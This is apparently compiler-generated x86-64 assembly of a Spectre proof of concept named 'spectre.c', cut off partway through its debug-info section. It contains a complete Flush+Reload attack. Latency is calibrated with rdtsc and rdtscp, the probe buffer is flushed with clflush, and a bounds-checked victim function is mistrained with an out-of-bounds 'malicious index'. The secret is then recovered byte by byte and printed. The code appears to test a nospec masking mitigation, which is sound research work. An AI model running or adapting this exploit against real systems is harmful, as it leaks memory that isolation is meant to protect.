	.file	"spectre.c"
	.text
.Ltext0:
	.type	array_index_mask_nospec, @function
array_index_mask_nospec:
.LFB6:
	.file 1 "./lib/nospec.h"
	.loc 1 3 1
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movq	%rsi, -16(%rbp)
	.loc 1 11 37
	movq	-16(%rbp), %rax
	subq	-8(%rbp), %rax
	subq	$1, %rax
	.loc 1 11 23
	orq	-8(%rbp), %rax
	.loc 1 11 9
	notq	%rax
	.loc 1 11 47
	sarq	$63, %rax
	.loc 1 12 1
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE6:
	.size	array_index_mask_nospec, .-array_index_mask_nospec
	.globl	array_size
	.data
	.align 4
	.type	array_size, @object
	.size	array_size, 4
array_size:
	.long	8
	.section	.rodata
.LC0:
	.string	"setrlimit failed"
	.text
	.globl	set_heap_limit
	.type	set_heap_limit, @function
set_heap_limit:
.LFB4212:
	.file 2 "spectre.c"
	.loc 2 25 41
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movq	%rdi, -24(%rbp)
	.loc 2 27 17
	movq	-24(%rbp), %rax
	movq	%rax, -16(%rbp)
	.loc 2 28 17
	movq	-24(%rbp), %rax
	movq	%rax, -8(%rbp)
	.loc 2 30 9
	leaq	-16(%rbp), %rax
	movq	%rax, %rsi
	movl	$9, %edi
	call	setrlimit
	.loc 2 30 8
	testl	%eax, %eax
	je	.L5
	.loc 2 31 9
	movl	$.LC0, %edi
	call	perror
	.loc 2 32 9
	movl	$1, %edi
	call	exit
.L5:
	.loc 2 34 1
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4212:
	.size	set_heap_limit, .-set_heap_limit
	.section	.rodata
.LC1:
	.string	"Initial malloc failed"
	.text
	.globl	secret_init
	.type	secret_init, @function
secret_init:
.LFB4213:
	.loc 2 36 23
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	.loc 2 37 22
	movl	$1, %edi
	call	malloc
	movq	%rax, -8(%rbp)
	.loc 2 38 8
	cmpq	$0, -8(%rbp)
	jne	.L7
	.loc 2 39 9
	movl	$.LC1, %edi
	call	perror
	.loc 2 40 16
	movl	$0, %eax
	jmp	.L8
.L7:
	.loc 2 42 14
	movq	-8(%rbp), %rax
	movb	$33, (%rax)
	.loc 2 43 12
	movq	-8(%rbp), %rax
.L8:
	.loc 2 44 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4213:
	.size	secret_init, .-secret_init
	.globl	array_init
	.type	array_init, @function
array_init:
.LFB4214:
	.loc 2 46 22
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	.loc 2 47 22
	movl	array_size(%rip), %eax
	movl	%eax, %eax
	movq	%rax, %rdi
	call	malloc
	movq	%rax, -8(%rbp)
	.loc 2 48 8
	cmpq	$0, -8(%rbp)
	jne	.L10
	.loc 2 49 9
	movl	$.LC1, %edi
	call	perror
	.loc 2 50 16
	movl	$0, %eax
	jmp	.L11
.L10:
	.loc 2 52 12
	movq	-8(%rbp), %rax
.L11:
	.loc 2 53 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4214:
	.size	array_init, .-array_init
	.type	realloc_wrapper, @function
realloc_wrapper:
.LFB4215:
	.loc 2 55 74
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	leaq	-32(%rbp), %rax
	movq	%rax, -16(%rbp)
.LBB38:
.LBB39:
	.file 3 "/usr/lib/gcc/x86_64-redhat-linux/8/include/emmintrin.h"
	.loc 3 1486 3
	movq	-16(%rbp), %rax
	clflush	(%rax)
	leaq	-40(%rbp), %rax
	movq	%rax, -8(%rbp)
.LBE39:
.LBE38:
.LBB40:
.LBB41:
	movq	-8(%rbp), %rax
	clflush	(%rax)
.LBE41:
.LBE40:
	.loc 2 58 18
	movq	-40(%rbp), %rdx
	movq	-32(%rbp), %rax
	.loc 2 58 8
	cmpq	%rax, %rdx
	ja	.L13
	.loc 2 58 54 discriminator 1
	movq	-32(%rbp), %rax
	shrq	%rax
	movq	%rax, %rdx
	.loc 2 58 42 discriminator 1
	movq	-40(%rbp), %rax
	.loc 2 58 30 discriminator 1
	cmpq	%rax, %rdx
	ja	.L13
	.loc 2 59 16
	movq	-24(%rbp), %rax
	jmp	.L14
.L13:
	.loc 2 61 16
	movq	-40(%rbp), %rdx
	movq	-24(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	realloc
.L14:
	.loc 2 63 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4215:
	.size	realloc_wrapper, .-realloc_wrapper
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4216:
	.loc 2 65 107
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movq	%rdi, -40(%rbp)
	movq	%rsi, -48(%rbp)
	movl	%edx, -52(%rbp)
	movl	%ecx, -56(%rbp)
	movl	%r8d, -60(%rbp)
	.loc 2 66 14
	movl	-60(%rbp), %eax
	movl	%eax, -4(%rbp)
	.loc 2 67 14
	movl	-60(%rbp), %edx
	movl	array_size(%rip), %eax
	movl	%eax, %ecx
	movq	-40(%rbp), %rax
	movq	(%rax), %rax
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	realloc_wrapper
	movq	%rax, %rdx
	.loc 2 67 12
	movq	-40(%rbp), %rax
	movq	%rdx, (%rax)
.LBB42:
	.loc 2 69 23
	movl	-52(%rbp), %eax
	movl	%eax, -8(%rbp)
	movl	-4(%rbp), %eax
	movl	%eax, -12(%rbp)
	movl	-12(%rbp), %edx
	movl	-8(%rbp), %eax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	array_index_mask_nospec
	movq	%rax, -24(%rbp)
	movq	-24(%rbp), %rax
	andl	%eax, -8(%rbp)
	movl	-8(%rbp), %eax
.LBE42:
	.loc 2 69 13
	movb	%al, -25(%rbp)
	.loc 2 70 23
	movq	-40(%rbp), %rax
	movq	(%rax), %rdx
	.loc 2 70 30
	movzbl	-25(%rbp), %eax
	addq	%rdx, %rax
	.loc 2 70 13
	movzbl	(%rax), %eax
	movb	%al, -26(%rbp)
	.loc 2 71 40
	movzbl	-26(%rbp), %eax
	imull	-56(%rbp), %eax
	movl	%eax, %edx
	.loc 2 71 32
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	.loc 2 71 13
	movzbl	(%rax), %eax
	movb	%al, -27(%rbp)
	.loc 2 73 12
	movl	$0, %eax
	.loc 2 74 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4216:
	.size	victim_function, .-victim_function
	.globl	csel
	.type	csel, @function
csel:
.LFB4217:
	.loc 2 86 44
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	%edx, %eax
	movb	%al, -36(%rbp)
	.loc 2 87 20
	movzbl	-36(%rbp), %eax
	movzbl	%al, %eax
	.loc 2 87 12
	negq	%rax
	movq	%rax, -8(%rbp)
	.loc 2 88 15
	movq	-24(%rbp), %rax
	andq	-8(%rbp), %rax
	movq	%rax, %rdx
	.loc 2 88 30
	movq	-8(%rbp), %rax
	notq	%rax
	.loc 2 88 28
	andq	-32(%rbp), %rax
	.loc 2 88 23
	orq	%rdx, %rax
	.loc 2 90 1
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4217:
	.size	csel, .-csel
	.globl	flush_lines
	.type	flush_lines, @function
flush_lines:
.LFB4218:
	.loc 2 92 56
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
.LBB43:
	.loc 2 93 17
	movq	$0, -8(%rbp)
	.loc 2 93 5
	jmp	.L20
.L21:
	.loc 2 94 36 discriminator 3
	movq	-32(%rbp), %rax
	imulq	-8(%rbp), %rax
	movq	%rax, %rdx
	.loc 2 94 27 discriminator 3
	movq	-24(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -16(%rbp)
.LBB44:
.LBB45:
	.loc 3 1486 3 discriminator 3
	movq	-16(%rbp), %rax
	clflush	(%rax)
.LBE45:
.LBE44:
	.loc 2 93 32 discriminator 3
	addq	$1, -8(%rbp)
.L20:
	.loc 2 93 5 discriminator 1
	movq	-8(%rbp), %rax
	cmpq	-40(%rbp), %rax
	jb	.L21
.LBE43:
	.loc 2 96 1
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4218:
	.size	flush_lines, .-flush_lines
	.section	.rodata
	.align 8
.LC2:
	.string	"Best guess: '%c' (ASCII=%#4x, #hits=%3lu); 2nd best guess: '%c' (ASCII=%#4x, #hits=%3lu)\n"
	.text
	.globl	decode_flush_reload_state
	.type	decode_flush_reload_state, @function
decode_flush_reload_state:
.LFB4219:
	.loc 2 98 69
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$80, %rsp
	movq	%rdi, -56(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%rdx, -72(%rbp)
	.loc 2 99 14
	movq	$0, -8(%rbp)
	.loc 2 99 29
	movq	$0, -16(%rbp)
	.loc 2 100 19
	movb	$0, -17(%rbp)
	.loc 2 100 33
	movb	$0, -18(%rbp)
.LBB46:
	.loc 2 101 17
	movq	$0, -32(%rbp)
	.loc 2 101 5
	jmp	.L23
.L26:
	.loc 2 102 29
	movq	-32(%rbp), %rax
	leaq	0(,%rax,8), %rdx
	movq	-64(%rbp), %rax
	addq	%rdx, %rax
	movq	(%rax), %rax
	.loc 2 102 12
	cmpq	%rax, -8(%rbp)
	jnb	.L24
	.loc 2 103 27
	movq	-8(%rbp), %rax
	movq	%rax, -16(%rbp)
	.loc 2 104 23
	movzbl	-17(%rbp), %eax
	movb	%al, -18(%rbp)
	.loc 2 106 29
	movq	-32(%rbp), %rax
	leaq	0(,%rax,8), %rdx
	movq	-64(%rbp), %rax
	addq	%rdx, %rax
	.loc 2 106 23
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	.loc 2 107 19
	movq	-32(%rbp), %rax
	movb	%al, -17(%rbp)
.L24:
	.loc 2 101 52 discriminator 2
	addq	$1, -32(%rbp)
.L23:
	.loc 2 101 5 discriminator 1
	movq	-32(%rbp), %rax
	cmpq	-72(%rbp), %rax
	jnb	.L25
	.loc 2 101 32 discriminator 3
	cmpq	$255, -32(%rbp)
	jbe	.L26
.L25:
.LBE46:
	.loc 2 111 10
	call	__ctype_b_loc
	movq	(%rax), %rax
	movzbl	-17(%rbp), %edx
	addq	%rdx, %rdx
	addq	%rdx, %rax
	movzwl	(%rax), %eax
	movzwl	%ax, %eax
	andl	$16384, %eax
	.loc 2 111 8
	testl	%eax, %eax
	je	.L27
	.loc 2 111 8 is_stmt 0 discriminator 1
	movzbl	-17(%rbp), %eax
	jmp	.L28
.L27:
	.loc 2 111 8 discriminator 2
	movl	$63, %eax
.L28:
	.loc 2 111 8 discriminator 4
	movq	-56(%rbp), %rdx
	movb	%al, (%rdx)
	.loc 2 112 18 is_stmt 1 discriminator 4
	call	__ctype_b_loc
	movq	(%rax), %rax
	movzbl	-18(%rbp), %edx
	addq	%rdx, %rdx
	addq	%rdx, %rax
	movzwl	(%rax), %eax
	movzwl	%ax, %eax
	andl	$16384, %eax
	.loc 2 112 10 discriminator 4
	testl	%eax, %eax
	je	.L29
	.loc 2 112 10 is_stmt 0 discriminator 1
	movzbl	-18(%rbp), %eax
	jmp	.L30
.L29:
	.loc 2 112 10 discriminator 2
	movl	$63, %eax
.L30:
	.loc 2 112 10 discriminator 4
	movb	%al, -33(%rbp)
	.loc 2 113 5 is_stmt 1 discriminator 4
	movzbl	-18(%rbp), %edi
	movsbl	-33(%rbp), %esi
	.loc 2 115 16 discriminator 4
	movq	-56(%rbp), %rax
	movzbl	(%rax), %eax
	.loc 2 113 5 discriminator 4
	movsbl	%al, %edx
	.loc 2 115 12 discriminator 4
	movq	-56(%rbp), %rax
	movzbl	(%rax), %eax
	.loc 2 113 5 discriminator 4
	movsbl	%al, %eax
	movq	-8(%rbp), %rcx
	subq	$8, %rsp
	pushq	-16(%rbp)
	movl	%edi, %r9d
	movl	%esi, %r8d
	movl	%eax, %esi
	movl	$.LC2, %edi
	movl	$0, %eax
	call	printf
	addq	$16, %rsp
	.loc 2 116 1 discriminator 4
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4219:
	.size	decode_flush_reload_state, .-decode_flush_reload_state
	.section	.rodata
.LC3:
	.string	"spectre.c"
.LC4:
	.string	"data"
	.align 8
.LC5:
	.string	"Avg. hit latency: %lu, Avg. miss latency: %lu, Threshold: %lu\n"
	.text
	.globl	calibrate_latency
	.type	calibrate_latency, @function
calibrate_latency:
.LFB4220:
	.loc 2 121 30
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	addq	$-128, %rsp
	.loc 2 122 14
	movq	$0, -8(%rbp)
	.loc 2 122 23
	movq	$0, -16(%rbp)
	.loc 2 122 44
	movq	$1000, -32(%rbp)
	.loc 2 123 21
	movl	$8, %edi
	call	malloc
	movq	%rax, -40(%rbp)
	.loc 2 124 5
	cmpq	$0, -40(%rbp)
	jne	.L32
	.loc 2 124 5 is_stmt 0 discriminator 1
	movl	$__PRETTY_FUNCTION__.25760, %ecx
	movl	$124, %edx
	movl	$.LC3, %esi
	movl	$.LC4, %edi
	call	__assert_fail
.L32:
.LBB47:
	.loc 2 127 5 is_stmt 1
	movq	-40(%rbp), %rax
#APP
# 127 "spectre.c" 1
	mov (%rax), %al

# 0 "" 2
#NO_APP
	movb	%al, -41(%rbp)
.LBE47:
.LBB48:
	.loc 2 128 19
	movl	$0, -20(%rbp)
	.loc 2 128 5
	jmp	.L33
.L34:
.LBB49:
.LBB50:
	.loc 2 129 26 discriminator 3
#APP
# 129 "spectre.c" 1
	mfence
	lfence
	rdtsc
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -56(%rbp)
	movq	-56(%rbp), %rax
.LBE50:
	.loc 2 129 18 discriminator 3
	movq	%rax, -64(%rbp)
.LBB51:
	.loc 2 130 9 discriminator 3
	movq	-40(%rbp), %rax
#APP
# 130 "spectre.c" 1
	mov (%rax), %al

# 0 "" 2
#NO_APP
	movb	%al, -65(%rbp)
.LBE51:
.LBB52:
	.loc 2 131 16 discriminator 3
#APP
# 131 "spectre.c" 1
	rdtscp
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -80(%rbp)
	movq	-80(%rbp), %rax
.LBE52:
	.loc 2 131 29 discriminator 3
	subq	-64(%rbp), %rax
	.loc 2 131 13 discriminator 3
	addq	%rax, -8(%rbp)
.LBE49:
	.loc 2 128 36 discriminator 3
	addl	$1, -20(%rbp)
.L33:
	.loc 2 128 28 discriminator 1
	movl	-20(%rbp), %eax
	.loc 2 128 5 discriminator 1
	cmpq	%rax, -32(%rbp)
	ja	.L34
.LBE48:
	.loc 2 133 9
	movq	-8(%rbp), %rax
	movl	$0, %edx
	divq	-32(%rbp)
	movq	%rax, -8(%rbp)
.LBB53:
	.loc 2 136 19
	movl	$0, -24(%rbp)
	.loc 2 136 5
	jmp	.L35
.L36:
	movq	-40(%rbp), %rax
	movq	%rax, -128(%rbp)
.LBB54:
.LBB55:
.LBB56:
	.loc 3 1486 3 discriminator 3
	movq	-128(%rbp), %rax
	clflush	(%rax)
.LBE56:
.LBE55:
.LBB57:
	.loc 2 138 26 discriminator 3
#APP
# 138 "spectre.c" 1
	mfence
	lfence
	rdtsc
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -88(%rbp)
	movq	-88(%rbp), %rax
.LBE57:
	.loc 2 138 18 discriminator 3
	movq	%rax, -96(%rbp)
.LBB58:
	.loc 2 139 9 discriminator 3
	movq	-40(%rbp), %rax
#APP
# 139 "spectre.c" 1
	mov (%rax), %al

# 0 "" 2
#NO_APP
	movb	%al, -97(%rbp)
.LBE58:
.LBB59:
	.loc 2 140 17 discriminator 3
#APP
# 140 "spectre.c" 1
	rdtscp
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -112(%rbp)
	movq	-112(%rbp), %rax
.LBE59:
	.loc 2 140 30 discriminator 3
	subq	-96(%rbp), %rax
	.loc 2 140 14 discriminator 3
	addq	%rax, -16(%rbp)
.LBE54:
	.loc 2 136 36 discriminator 3
	addl	$1, -24(%rbp)
.L35:
	.loc 2 136 28 discriminator 1
	movl	-24(%rbp), %eax
	.loc 2 136 5 discriminator 1
	cmpq	%rax, -32(%rbp)
	ja	.L36
.LBE53:
	.loc 2 142 10
	movq	-16(%rbp), %rax
	movl	$0, %edx
	divq	-32(%rbp)
	movq	%rax, -16(%rbp)
	.loc 2 144 21
	movq	-16(%rbp), %rax
	leaq	(%rax,%rax), %rdx
	.loc 2 144 29
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	.loc 2 144 15
	movabsq	$-6148914691236517205, %rdx
	mulq	%rdx
	movq	%rdx, %rax
	shrq	%rax
	movq	%rax, -120(%rbp)
	.loc 2 145 5
	movq	-120(%rbp), %rcx
	movq	-16(%rbp), %rdx
	movq	-8(%rbp), %rax
	movq	%rax, %rsi
	movl	$.LC5, %edi
	movl	$0, %eax
	call	printf
	.loc 2 148 5
	movq	-40(%rbp), %rax
	movq	%rax, %rdi
	call	free
	.loc 2 149 12
	movq	-120(%rbp), %rax
	.loc 2 150 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4220:
	.size	calibrate_latency, .-calibrate_latency
	.section	.rodata
.LC6:
	.string	"mmap"
	.align 8
.LC7:
	.string	"-----------------------------------------"
	.align 8
.LC8:
	.string	"Secret address: %p, Array address: %p\n"
	.align 8
.LC9:
	.string	"The malicious index is %p-%p=%#lx\n"
.LC10:
	.string	"Recovered secret: \"%s\"\n"
	.text
	.globl	attacker_function
	.type	attacker_function, @function
attacker_function:
.LFB4221:
	.loc 2 153 26
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$2256, %rsp
	.loc 2 156 22
	movl	$0, %eax
	call	array_init
	.loc 2 156 14
	movq	%rax, -184(%rbp)
	.loc 2 157 20
	movl	$0, %eax
	call	secret_init
	movq	%rax, -40(%rbp)
	.loc 2 158 22
	movl	$0, %r9d
	movl	$-1, %r8d
	movl	$34, %ecx
	movl	$3, %edx
	movl	$1048576, %esi
	movl	$0, %edi
	call	mmap
	movq	%rax, -48(%rbp)
	.loc 2 160 8
	cmpq	$-1, -48(%rbp)
	jne	.L39
	.loc 2 161 9
	movl	$.LC6, %edi
	call	perror
	.loc 2 162 16
	call	__errno_location
	jmp	.L38
.L39:
	.loc 2 164 5
	movq	-48(%rbp), %rax
	movl	$1048576, %edx
	movl	$1, %esi
	movq	%rax, %rdi
	call	memset
	.loc 2 167 26
	movl	$0, %eax
	call	calibrate_latency
	movq	%rax, -56(%rbp)
	.loc 2 168 5
	movl	$.LC7, %edi
	call	puts
	.loc 2 169 14
	leaq	-2240(%rbp), %rdx
	movl	$0, %eax
	movl	$256, %ecx
	movq	%rdx, %rdi
	rep stosq
	.loc 2 170 10
	movb	$0, -2241(%rbp)
	.loc 2 173 14
	movq	-184(%rbp), %rax
	movq	%rax, -64(%rbp)
	.loc 2 174 30
	movq	-40(%rbp), %rdx
	.loc 2 174 50
	movq	-64(%rbp), %rax
	.loc 2 174 12
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -72(%rbp)
	.loc 2 175 5
	movq	-64(%rbp), %rdx
	movq	-40(%rbp), %rax
	movq	%rax, %rsi
	movl	$.LC8, %edi
	movl	$0, %eax
	call	printf
	.loc 2 176 5
	movq	-72(%rbp), %rcx
	movq	-64(%rbp), %rdx
	movq	-40(%rbp), %rax
	movq	%rax, %rsi
	movl	$.LC9, %edi
	movl	$0, %eax
	call	printf
	.loc 2 178 5
	movl	$.LC7, %edi
	call	puts
.LBB60:
	.loc 2 180 17
	movq	$0, -8(%rbp)
	.loc 2 180 5
	jmp	.L41
.L49:
.LBB61:
	.loc 2 182 21
	movq	$0, -16(%rbp)
	.loc 2 182 9
	jmp	.L42
.L47:
.LBB62:
	.loc 2 183 42
	movl	array_size(%rip), %eax
	subl	$1, %eax
	.loc 2 183 20
	movl	%eax, %eax
	movq	%rax, -80(%rbp)
	.loc 2 184 43
	movl	array_size(%rip), %eax
	shrl	%eax
	.loc 2 184 20
	movl	%eax, %eax
	movq	%rax, -88(%rbp)
	.loc 2 185 20
	movq	-72(%rbp), %rax
	addq	$1, %rax
	movq	%rax, -96(%rbp)
.LBB63:
	.loc 2 186 25
	movq	$0, -24(%rbp)
	.loc 2 186 13
	jmp	.L43
.L44:
.LBB64:
	.loc 2 190 37 discriminator 3
	movq	-24(%rbp), %rax
	andl	$15, %eax
	.loc 2 190 22 discriminator 3
	cmpq	$15, %rax
	sete	%al
	movb	%al, -97(%rbp)
	.loc 2 191 31 discriminator 3
	movzbl	-97(%rbp), %edx
	movq	-80(%rbp), %rcx
	movq	-96(%rbp), %rax
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	csel
	movq	%rax, -112(%rbp)
	.loc 2 192 32 discriminator 3
	movzbl	-97(%rbp), %edx
	movq	-88(%rbp), %rcx
	movq	-72(%rbp), %rax
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	csel
	movq	%rax, -120(%rbp)
	.loc 2 197 17 discriminator 3
	movq	-48(%rbp), %rax
	movl	$256, %edx
	movl	$4096, %esi
	movq	%rax, %rdi
	call	flush_lines
.LBB65:
.LBB66:
	.loc 3 1498 3 discriminator 3
	mfence
.LBE66:
.LBE65:
.LBB67:
.LBB68:
	.loc 3 1492 3 discriminator 3
	lfence
.LBE68:
.LBE67:
.LBB69:
	.loc 2 210 17 discriminator 3
	movq	-112(%rbp), %rax
	movl	%eax, %ecx
	movq	-120(%rbp), %rax
	movl	%eax, %edx
	movq	-48(%rbp), %rsi
	leaq	-184(%rbp), %rax
	movl	%ecx, %r8d
	movl	$4096, %ecx
	movq	%rax, %rdi
	call	victim_function
	movq	%rax, -128(%rbp)
	movq	-128(%rbp), %rax
#APP
# 210 "spectre.c" 1
	xor %rax, %rax

# 0 "" 2
#NO_APP
	movq	%rax, -128(%rbp)
.LBE69:
.LBE64:
	.loc 2 186 53 discriminator 3
	addq	$1, -24(%rbp)
.L43:
	.loc 2 186 13 discriminator 1
	cmpq	$15, -24(%rbp)
	jbe	.L44
.LBE63:
.LBB70:
	.loc 2 213 25
	movq	$0, -32(%rbp)
	.loc 2 213 13
	jmp	.L45
.L46:
.LBB71:
	.loc 2 216 33 discriminator 3
	movq	-32(%rbp), %rax
	imulq	$167, %rax, %rax
	.loc 2 216 39 discriminator 3
	addq	$13, %rax
	.loc 2 216 24 discriminator 3
	andl	$255, %eax
	movq	%rax, -136(%rbp)
	.loc 2 220 50 discriminator 3
	movq	-136(%rbp), %rax
	salq	$12, %rax
	movq	%rax, %rdx
	.loc 2 220 26 discriminator 3
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -144(%rbp)
.LBB72:
.LBB73:
	.loc 2 221 31 discriminator 3
#APP
# 221 "spectre.c" 1
	mfence
	lfence
	rdtsc
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -152(%rbp)
	movq	-152(%rbp), %rax
.LBE73:
	movq	%rax, -160(%rbp)
.LBB74:
	movq	-144(%rbp), %rax
#APP
# 221 "spectre.c" 1
	mov (%rax), %al

# 0 "" 2
#NO_APP
	movb	%al, -161(%rbp)
.LBE74:
.LBB75:
#APP
# 221 "spectre.c" 1
	rdtscp
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -176(%rbp)
	movq	-176(%rbp), %rax
.LBE75:
	subq	-160(%rbp), %rax
.LBE72:
	.loc 2 221 50 discriminator 3
	cmpq	-56(%rbp), %rax
	setbe	%al
	movzbl	%al, %ecx
	.loc 2 221 27 discriminator 3
	movq	-136(%rbp), %rax
	movq	-2240(%rbp,%rax,8), %rdx
	.loc 2 221 50 discriminator 3
	movslq	%ecx, %rax
	.loc 2 221 27 discriminator 3
	addq	%rax, %rdx
	movq	-136(%rbp), %rax
	movq	%rdx, -2240(%rbp,%rax,8)
.LBE71:
	.loc 2 213 49 discriminator 3
	addq	$1, -32(%rbp)
.L45:
	.loc 2 213 13 discriminator 1
	cmpq	$255, -32(%rbp)
	jbe	.L46
.LBE70:
.LBE62:
	.loc 2 182 38 discriminator 2
	addq	$1, -16(%rbp)
.L42:
	.loc 2 182 9 discriminator 1
	cmpq	$99, -16(%rbp)
	jbe	.L47
.LBE61:
	.loc 2 226 9 discriminator 2
	leaq	-2241(%rbp), %rdx
	movq	-8(%rbp), %rax
	leaq	(%rdx,%rax), %rcx
	leaq	-2240(%rbp), %rax
	movl	$256, %edx
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	decode_flush_reload_state
	.loc 2 227 9 discriminator 2
	leaq	-2240(%rbp), %rax
	movl	$2048, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	.loc 2 180 61 discriminator 2
	addq	$1, -8(%rbp)
.L41:
	.loc 2 180 28 discriminator 1
	movq	-40(%rbp), %rax
	movq	%rax, %rdi
	call	strlen
	.loc 2 180 5 discriminator 1
	cmpq	%rax, -8(%rbp)
	jnb	.L48
	.loc 2 180 43 discriminator 3
	cmpq	$0, -8(%rbp)
	je	.L49
.L48:
.LBE60:
	.loc 2 229 5
	leaq	-2241(%rbp), %rax
	movq	%rax, %rsi
	movl	$.LC10, %edi
	movl	$0, %eax
	call	printf
	.loc 2 230 5
	movq	-48(%rbp), %rax
	movl	$1048576, %esi
	movq	%rax, %rdi
	call	munmap
	.loc 2 231 5
	movq	-184(%rbp), %rax
	movq	%rax, %rdi
	call	free
	.loc 2 232 5
	nop
.L38:
	.loc 2 233 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4221:
	.size	attacker_function, .-attacker_function
	.globl	main
	.type	main, @function
main:
.LFB4222:
	.loc 2 236 12
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	.loc 2 237 5
	movl	$10485760, %edi
	call	set_heap_limit
	.loc 2 238 5
	movl	$0, %eax
	call	attacker_function
	.loc 2 239 12
	movl	$0, %eax
	.loc 2 240 1
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4222:
	.size	main, .-main
	.section	.rodata
	.align 16
	.type	__PRETTY_FUNCTION__.25760, @object
	.size	__PRETTY_FUNCTION__.25760, 18
__PRETTY_FUNCTION__.25760:
	.string	"calibrate_latency"
	.text
.Letext0:
	.file 4 "/usr/lib/gcc/x86_64-redhat-linux/8/include/stddef.h"
	.file 5 "/usr/include/bits/types.h"
	.file 6 "/usr/include/bits/types/struct_FILE.h"
	.file 7 "/usr/include/bits/types/FILE.h"
	.file 8 "/usr/include/stdio.h"
	.file 9 "/usr/include/bits/sys_errlist.h"
	.file 10 "/usr/include/bits/stdint-uintn.h"
	.file 11 "/usr/include/stdint.h"
	.file 12 "/usr/include/bits/resource.h"
	.file 13 "/usr/include/ctype.h"
	.section	.debug_info,"",@progbits
.Ldebug_info0:
	.long	0xdf3
	.value	0x4
	.long	.Ldebug_abbrev0
	.byte	0x8
	.uleb128 0x1
	.long	.LASF142
	.byte	0xc
	.long	.LASF143
	.long	.LASF144
	.quad	.Ltext0
	.quad	.Letext0-.Ltext0
	.long	.Ldebug_line0
	.uleb128 0x2
	.long	.LASF5
	.byte	0x4
	.byte	0xd8
	.byte	0x17
	.long	0x39
	.uleb128 0x3
	.byte	0x8
	.byte	0x7
	.long	.LASF0
	.uleb128 0x3
	.byte	0x4
	.byte	0x7
	.long	.LASF1
	.uleb128 0x4
	.byte	0x8
	.uleb128 0x3
	.byte	0x1
	.byte	0x8
	.long	.LASF2
	.uleb128 0x3
	.byte	0x2
	.byte	0x7
	.long	.LASF3
	.uleb128 0x3
